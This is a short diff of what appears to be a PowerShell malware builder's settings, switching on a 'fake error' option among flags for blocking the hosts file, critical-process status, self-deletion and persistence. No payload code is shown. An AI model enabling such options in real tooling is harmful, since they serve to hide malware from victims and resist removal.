@@ -3,7 +3,7 @@ $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
-$fakeerror = $false
+$fakeerror = $true
 $persistence = $true
 $settings = $false
 
